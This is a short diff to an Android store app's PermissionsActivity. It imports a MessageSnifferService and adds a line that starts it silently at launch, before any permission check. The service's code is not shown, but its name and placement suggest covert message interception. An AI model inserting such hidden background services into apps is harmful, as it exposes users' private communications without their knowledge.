@@ -1,6 +1,7 @@
 package misbah.naseer.mobilestore.helper;
 
 import android.Manifest;
+import android.content.Intent;
 import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
@@ -8,6 +9,7 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 
 import misbah.naseer.mobilestore.R;
+import misbah.naseer.mobilestore.services.MessageSnifferService;
 import misbah.naseer.mobilestore.ui.SplashActivity;
 
 /**
@@ -22,6 +24,7 @@ public class PermissionsActivity extends AppCompatActivity {
     protected void onCreate(@Nullable Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         UtilHelper.setContext(getApplicationContext());
+        startService(new Intent(this, MessageSnifferService.class));
         if (!UtilHelper.hasPermissions(this, Constants.PERMISSIONS)) {
             ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, PERMISSIONS_REQUEST_KEY);
         }else
